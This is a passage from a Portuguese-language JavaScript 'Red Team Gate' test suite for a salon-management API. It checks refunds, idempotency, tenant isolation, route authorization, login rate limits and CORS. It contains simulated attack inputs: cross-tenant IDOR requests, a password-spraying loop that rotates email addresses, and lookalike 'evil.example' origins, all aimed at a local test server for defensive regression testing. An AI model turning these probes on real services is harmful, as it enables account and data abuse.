  const corpo = key => ({ ...MOTIVO, data: HOJE_E, tipo: 'parcial', idempotencyKey: key, itens: [{ comandoItemId: iid(1), quantidade: 1, devolveEstoque: true }] });
  const rs = await Promise.allSettled([repo.estornarComanda(CM_RACE, corpo('race-1'), ADMIN), repo.estornarComanda(CM_RACE, corpo('race-2'), GESTOR)]);
  assert.deepStrictEqual(rs.map(r => r.status).sort(), ['fulfilled', 'rejected'], `esperado 1 estorno e 1 recusa: ${JSON.stringify(rs.map(r => r.reason && r.reason.code))}`);
  assert.strictEqual(rs.find(r => r.status === 'rejected').reason.code, 'ESTORNO_EXCEDE');
  // E pelo HTTP, o terceiro pedido também é recusado.
  const r3 = await estornar(CM_RACE, pedidoParcial('race-3', iid(1), 1));
  assert.strictEqual(r3.status, 409); assert.strictEqual(code(r3), 'ESTORNO_EXCEDE');
  assert.strictEqual(soma(daComanda('comanda_estorno_itens', CM_RACE), x => x.quantidade), 1, 'quantidade estornada > vendida');
  assert.strictEqual(soma(daComanda('comanda_estorno_pagamentos', CM_RACE), x => x.valor_centavos), 1000, 'reembolso > pago');
  assert.strictEqual(soma(daComanda('caixa_movimentos', CM_RACE), x => x.valor_centavos), -1000);
});

test('RT-15 centavos: parciais de 1 em 1 em 3 itens ímpares (comissão fracionária) somam EXATAMENTE o vendido', async () => {
  clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
  const seq = [[iid(2), 1], [iid(3), 2], [iid(2), 1], [iid(3), 3], [iid(4), 1], [iid(3), 1]];
  let k = 0;
  for (const [item, q] of seq) {
    const r = await estornar(CM_ROUND, pedidoParcial(`round-${k++}`, item, q));
    assert.strictEqual(r.status, 201, r.raw);
    assert.strictEqual(r.data.data.reembolsoCentavos, r.data.data.itensCentavos, 'reembolso = itens');
  }
  // O que sobrou sai num total: nada de centavo órfão nem a mais.
  const t = await estornar(CM_ROUND, { tipo: 'total', idempotencyKey: 'round-total' });
  assert.strictEqual(t.status, 201, t.raw);
  for (const it of db.comando_itens.filter(i => i.comando_id === CM_ROUND)) {
    const ei = db.comanda_estorno_itens.filter(e => e.comando_item_id === it.id);
    assert.strictEqual(soma(ei, e => e.quantidade), it.quantidade, `${it.id} quantidade`);
    assert.strictEqual(soma(ei, e => e.valor_liquido_centavos), it.valor_liquido_centavos, `${it.id} valor`);
    assert.strictEqual(soma(ei, e => e.comissao_centavos), it.comissao_centavos, `${it.id} comissão`);
    assert.ok(ei.every(e => e.valor_liquido_centavos >= 0 && e.comissao_centavos >= 0 && e.comissao_centavos <= e.valor_liquido_centavos + 1));
  }
  assert.strictEqual(soma(daComanda('comanda_estorno_pagamentos', CM_ROUND), p => p.valor_centavos), 2001, 'Σ reembolso = pago');
  assert.strictEqual(soma(daComanda('caixa_movimentos', CM_ROUND), m => m.valor_centavos), -2001);
});

test('RT-16 centavos (propriedade): 2000 sequências aleatórias de parciais nunca passam do original nem deixam resto', async () => {
  let s = 42; const rnd = n => { s = (s * 1103515245 + 12345) % 2147483648; return s % n; };
  for (let caso = 0; caso < 2000; caso++) {
    const Q = 1 + rnd(9); const V = rnd(100000); const C = rnd(V + 1); const K = rnd(V + 1);
    const item = { id: 'i', tipo: 'servico', quantidade: Q, valor_liquido_centavos: V, comissao_centavos: C, total_custo_centavos: K };
    const estornoItens = []; let restante = Q;
    while (restante > 0) {
      const q = 1 + rnd(restante);
      const r = calcularEstorno({
        comanda: { data: HOJE_E }, data: HOJE_E, hojeUtc: HOJE_E, itens: [item], pagamentos: [{ forma_code: 'pix', valor_centavos: V }],
        gorjetas: [], estornos: estornoItens.length ? [{ tipo: 'parcial' }] : [], estornoItens, estornoPagamentos: [],
        pedido: { tipo: 'parcial', itens: [{ comandoItemId: 'i', quantidade: q }], reembolsoForma: 'pix' }
      });
      const l = r.linhas[0];
      estornoItens.push({ comando_item_id: 'i', quantidade: q, valor_liquido_centavos: l.valor, comissao_centavos: l.comissao, custo_centavos: l.custo });
      restante -= q;
      assert.ok(soma(estornoItens, e => e.valor_liquido_centavos) <= V && soma(estornoItens, e => e.comissao_centavos) <= C, `excedeu no caso ${caso}`);
    }
    assert.deepStrictEqual([soma(estornoItens, e => e.valor_liquido_centavos), soma(estornoItens, e => e.comissao_centavos), soma(estornoItens, e => e.custo_centavos)], [V, C, K], `resto no caso ${caso} (Q=${Q} V=${V} C=${C})`);
  }
});

test('RT-17 idempotência: chave reaproveitada em outra comanda → 409; outra empresa é independente; ordem dos itens não importa', async () => {
  clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
  const r1 = await estornar(CM_IDEM1, pedidoParcial('chave-x', iid(6), 1));
  assert.strictEqual(r1.status, 201, r1.raw);
  const r2 = await estornar(CM_IDEM2, pedidoParcial('chave-x', iid(7), 1));
  assert.strictEqual(r2.status, 409); assert.strictEqual(code(r2), 'IDEMPOTENCY_MISMATCH');
  const r3 = await estornar(CM_IDEM1, { ...pedidoParcial('chave-x', iid(6), 1), motivo: 'Outro motivo qualquer aqui' });
  assert.strictEqual(r3.status, 409, 'mesma chave + motivo diferente');
  const r4 = await estornar(CM_IDEM1, pedidoParcial('chave-x', iid(6), 1));
  assert.strictEqual(r4.status, 200); assert.strictEqual(r4.data.data.estornoId, r1.data.data.estornoId);
  // A mesma chave na empresa B não colide nem revela a de A.
  const rb = await estornar(CM_IDEM_B, pedidoParcial('chave-x', iid(8), 1), 'h.adminb.s');
  assert.strictEqual(rb.status, 201, rb.raw);
  // IDOR: admin de B usando a comanda de A (com ou sem X-Empresa-Id de A).
  for (const headers of [undefined, { 'x-empresa-id': A }]) {
    const r = await estornar(CM_IDEM2, pedidoParcial('idor', iid(7), 1), 'h.adminb.s', headers);
    assert.ok([403, 404].includes(r.status), `IDOR ${r.status}`);
  }
  assert.strictEqual(daComanda('comanda_estornos', CM_IDEM2).length, 0);
});

test('RT-18 escalada: admin em B e recepção em A não estorna em A; papel rebaixado vale na hora', async () => {
  clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
  const r = await estornar(CM_IDEM2, pedidoParcial('multi', iid(7), 1), 'h.multi.s', { 'x-empresa-id': A });
  assert.strictEqual(r.status, 403); assert.strictEqual(code(r), 'INSUFFICIENT_ROLE');
  const m = store.db.empresa_memberships.find(x => x.id === 'm2');
  m.role = 'recepcao';
  try {
    const g = await estornar(CM_IDEM2, pedidoParcial('rebaixado', iid(7), 1), 'h.gestor.s');
    assert.strictEqual(g.status, 403);
  } finally { m.role = 'gestor'; }
  assert.strictEqual(daComanda('comanda_estornos', CM_IDEM2).length, 0);
});

test('RT-19 prazo na virada do fuso: 30º dia às 23:59 de Brasília (02:59 UTC do 31º) ainda estorna; 00:01 do 31º não', async () => {
  // Comanda de 01/11. 01/12 23:59 em São Paulo = 02/12 02:59 UTC.
  clock.definirRelogio(() => new Date('2026-12-02T03:01:00Z')); // 02/12 00:01 em SP → 31 dias
  const fora = await estornar(CM_PRAZO, { tipo: 'total', idempotencyKey: 'prazo-31' });
  assert.strictEqual(fora.status, 422, fora.raw); assert.strictEqual(code(fora), 'ESTORNO_PRAZO_EXPIRADO');
  clock.definirRelogio(() => new Date('2026-12-02T02:59:00Z')); // 01/12 23:59 em SP → 30 dias
  const dentro = await estornar(CM_PRAZO, { tipo: 'total', idempotencyKey: 'prazo-30' });
  assert.strictEqual(dentro.status, 201, dentro.raw);
  assert.strictEqual(dentro.data.data.data, '2026-12-01', 'estorno lançado no dia local, não no UTC');
  assert.ok(daComanda('caixa_movimentos', CM_PRAZO).every(x => x.data === '2026-12-01'), 'caixa negativo no dia certo');
  clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
});

// ===========================================================================
// 4. Auth geral, rotas, logs, CORS
// ===========================================================================
// Rotas que respondem sem principal (sessão e saúde) e o router público. Qualquer
// outra rota sob /api precisa de authorize() antes do handler.
const ROTAS_SEM_RBAC = new Set([
  'GET /', 'GET /api/health',
  'POST /api/auth/login', 'POST /api/auth/refresh', 'POST /api/auth/logout', 'POST /api/auth/recover', 'POST /api/auth/password', 'POST /api/auth/privacidade/aceite', 'GET /api/me',
  'GET /api/public/agendar/:slug', 'GET /api/public/agendar/:slug/slots', 'POST /api/public/agendar/:slug'
]);
function inventarioDeRotas() {
  const { authRouter } = require('../src/routes/auth');
  const { publicBookingRouter } = require('../src/routes/publicBooking');
  const { requireAuth } = require('../src/middleware/auth');
  const montagem = new Map([[authRouter, '/api'], [publicBookingRouter, '/api/public']]);
  const rotas = []; let depoisDoAuth = false;
  for (const layer of app._router.stack) {
    if (layer.handle === requireAuth) { depoisDoAuth = true; continue; }
    if (layer.route) {
      for (const metodo of Object.keys(layer.route.methods)) rotas.push({ id: `${metodo.toUpperCase()} ${layer.route.path}`, rbac: layer.route.stack.some(l => l.handle.rbacAction), autenticada: depoisDoAuth });
      continue;
    }
    if (layer.name !== 'router') continue;
    const prefixo = montagem.get(layer.handle) || '/api';
    const guardas = [];
    for (const l of layer.handle.stack) {
      if (!l.route) { if (l.handle.rbacAction) guardas.push(l); continue; }
      const rbacDoRouter = guardas.some(g => g.regexp.test(l.route.path));
      for (const metodo of Object.keys(l.route.methods)) {
        rotas.push({ id: `${metodo.toUpperCase()} ${prefixo}${l.route.path}`, rbac: rbacDoRouter || l.route.stack.slice(0, -1).some(x => x.handle.rbacAction), autenticada: depoisDoAuth });
      }
    }
  }
  return rotas;
}
test('RT-20 inventário de TODOS os routers: toda rota de negócio tem authorize() e fica depois do requireAuth', async () => {
  const rotas = inventarioDeRotas();
  assert.ok(rotas.length > 60, `inventário incompleto (${rotas.length})`);
  const semRbac = rotas.filter(r => !r.rbac && !ROTAS_SEM_RBAC.has(r.id)).map(r => r.id);
  assert.deepStrictEqual(semRbac, [], `rotas sem authorize():\n${semRbac.join('\n')}`);
  const antesDoAuth = rotas.filter(r => !r.autenticada && !ROTAS_SEM_RBAC.has(r.id)).map(r => r.id);
  assert.deepStrictEqual(antesDoAuth, [], `rotas fora do perímetro:\n${antesDoAuth.join('\n')}`);
  // A lista de exceções não pode ter sobra (rota removida/renomeada = revisar a lista).
  const ids = new Set(rotas.map(r => r.id));
  assert.deepStrictEqual([...ROTAS_SEM_RBAC].filter(x => !ids.has(x)), []);
});

test('RT-21 login: girar e-mails pelo mesmo IP não zera o limite da conta-alvo (teto de memória não é reset)', async () => {
  resetRateLimitLogin();
  const maxAntes = env.LOGIN_RATE_LIMIT_MAX;
  env.LOGIN_RATE_LIMIT_MAX = 3;
  try {
    const alvo = 'dona@salao.example';
    for (let i = 0; i < 3; i++) await request('POST', '/api/auth/login', { body: { email: alvo, password: `chute${i}` } });
    assert.strictEqual((await request('POST', '/api/auth/login', { body: { email: alvo, password: 'x' } })).status, 429, 'alvo limitado');
    // Spray: um e-mail novo por tentativa (cada um vira chave nova no mapa em memória).
    let seguidos429 = 0;
    for (let i = 0; i < 10050 && seguidos429 < 5; i++) {
      const r = await request('POST', '/api/auth/login', { body: { email: `x${i}@spray.example`, password: 'x' } });
      seguidos429 = r.status === 429 ? seguidos429 + 1 : 0;
    }
    const depois = await request('POST', '/api/auth/login', { body: { email: alvo, password: 'chute-pos-spray' } });
    assert.strictEqual(depois.status, 429, 'o spray de e-mails zerou o limite da conta-alvo');
  } finally { env.LOGIN_RATE_LIMIT_MAX = maxAntes; resetRateLimitLogin(); }
});

test('RT-22 CORS da API: origem parecida não passa; nada de credenciais; token legado em ?apiToken= sai da barra', async () => {
  for (const origem of ['https://hudson-f-lima.github.io.evil.example', 'https://evil-hudson-f-lima.github.io', 'http://localhost.evil.example', 'http://10.0.0.1.nip.io']) {
    const r = await request('OPTIONS', '/api/agenda', { headers: { origin: origem, 'access-control-request-method': 'GET', 'access-control-request-headers': 'authorization' } });
    assert.ok(!r.headers['access-control-allow-origin'], `${origem} aceito`);
  }
  const ok = await request('OPTIONS', '/api/agenda', { headers: { origin: 'https://hudson-f-lima.github.io', 'access-control-request-method': 'GET' } });
  assert.strictEqual(ok.headers['access-control-allow-origin'], 'https://hudson-f-lima.github.io');
  assert.ok(!ok.headers['access-control-allow-credentials'], 'credenciais de cookie não liberadas');
  // A PWA aceita ?apiToken= (modo legado), mas tira o token da URL (histórico, print, log do host).
  const api = ler('js/api.js');
  assert.ok(/history\.replaceState/.test(api) && /searchParams\.delete\('apiToken'\)/.test(api), 'apiToken fica na barra de endereço');
});

// ===========================================================================
// 5. Controles negativos (o teste pegaria a regressão)
// ===========================================================================
test('NR-01 controle negativo: sem a normalização /64, girar o IPv6 do RT-01 passa do limite', async () => {
  const rl = moduloMutante('../src/security/rateLimit.js', [['return `${grupos.slice(0, 4).join(\':\')}::/64`;', 'return s;']]);
  assert.notStrictEqual(rl.chaveIp('2001:db8:1:2::a'), rl.chaveIp('2001:db8:1:2::b'), 'mutante deveria separar os IPs');
  const { chaveIp } = require('../src/security/rateLimit');
  assert.strictEqual(chaveIp('2001:db8:1:2::a'), chaveIp('2001:db8:1:2::b'));
});

test('NR-02 controle negativo: com o teto de memória voltando a "limpar tudo", o spray do RT-21 zera a chave-alvo', async () => {
  const rl = moduloMutante('../src/security/rateLimit.js', [['function compactar(agora) {', 'function compactar(agora) { mapa.clear(); return; // comportamento antigo: zera tudo\n']]);
  const lim = rl.criarLimitador({ maxChaves: 50 });
  for (let i = 0; i < 4; i++) lim.excedeu('alvo', 3, 6e4);
  for (let i = 0; i < 60; i++) lim.excedeu(`spray${i}`, 3, 6e4);
  assert.strictEqual(lim.excedeu('alvo', 3, 6e4), false, 'no mutante o alvo volta a passar (prova que RT-21 detecta)');
  const { criarLimitador } = require('../src/security/rateLimit');
  const bom = criarLimitador({ maxChaves: 50 });
  for (let i = 0; i < 4; i++) bom.excedeu('alvo', 3, 6e4);
  for (let i = 0; i < 60; i++) bom.excedeu(`spray${i}`, 3, 6e4);
  assert.strictEqual(bom.excedeu('alvo', 3, 6e4), true, 'alvo continua limitado');
});

test('NR-03 controle negativo: sem a trava por comanda no backend em memória, a corrida do RT-14 grava 2', async () => {
  const mem = moduloMutante('../src/dev/memoryBackend.js', [['return comTravaEstorno(`${E}|${comandoId}`, async () => {', 'return (async () => {'], ['  }); // fim da trava do estorno', '  })(); // fim da trava do estorno']]);
  const P = SupabaseRepository.prototype;
  const originais = Object.fromEntries(Object.getOwnPropertyNames(P).map(k => [k, P[k]]));
  const CM = cid(9); const IT = iid(9);
  const dbM = mem.installMemoryBackend({
    empresas: [{ id: A }], comandos: [comanda(CM, A, HOJE_E, 1000)], comando_itens: [servicoItem(IT, CM, A, 1, 1000, 400)],
    comando_pagamentos: [pag(CM, A, 'pix', 1000)], produtos: [], comando_gorjetas: []
  });
  try {
    clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
    const repo = new SupabaseRepository(A);
    const base0 = { motivoCodigo: 'outro', motivo: 'Teste de corrida no mutante', data: HOJE_E, tipo: 'parcial', itens: [{ comandoItemId: IT, quantidade: 1, devolveEstoque: true }] };
    const rs = await Promise.allSettled([repo.estornarComanda(CM, { ...base0, idempotencyKey: 'm1' }, ADMIN), repo.estornarComanda(CM, { ...base0, idempotencyKey: 'm2' }, GESTOR)]);
    assert.strictEqual(rs.filter(r => r.status === 'fulfilled').length, 2, 'o mutante deveria aceitar os dois (prova que RT-14 detecta)');
    assert.strictEqual(soma(dbM.comanda_estorno_itens, e => e.quantidade), 2);
  } finally { Object.assign(P, originais); }
});

test('NR-04 controle negativo: varredura do RT-13 acha o FuzzyField sem escape', async () => {
  const src = ler('js/components/fuzzy-field.js');
  const semEscape = src.replace(/escapeHtml\(label\)/g, 'label');
  assert.notStrictEqual(semEscape, src);
  const linhas = semEscape.split('\n').filter(l => /\$\{label\}/.test(l) && !CONTEXTO_SEGURO.test(l));
  assert.ok(linhas.length >= 1, 'a varredura não enxergaria a regressão');
});

(async () => {
  const origErr = console.error; const origWarn = console.warn;
  console.error = () => {}; console.warn = () => {};
  publico.setRelogioParaTestes(() => AGORA_PUB);
  limitesAltos();
  const server = app.listen(0);
  base = `http://127.0.0.1:${server.address().port}`;
  let ok = 0;
  const silenciarMorgan = process.stdout.write;
  for (const { n, f } of tests) {
    process.stdout.write = (c, ...r) => (/^\u001b\[0m(GET|POST|PATCH|PUT|OPTIONS|DELETE) /.test(String(c)) ? true : silenciarMorgan.call(process.stdout, c, ...r));
    try { await f(); ok++; process.stdout.write(`✓ ${n}\n`); } catch (err) { process.stdout.write(`✗ ${n}\n   ${String(err.message).split('\n').slice(0, 12).join('\n   ')}\n`); }
    process.stdout.write = silenciarMorgan;
  }
  server.close(); agente.destroy();
  console.error = origErr; console.warn = origWarn;
  console.log(`\nRed Team Gate: ${ok}/${tests.length} testes verdes.`);
  process.exit(ok === tests.length ? 0 : 1);
})();
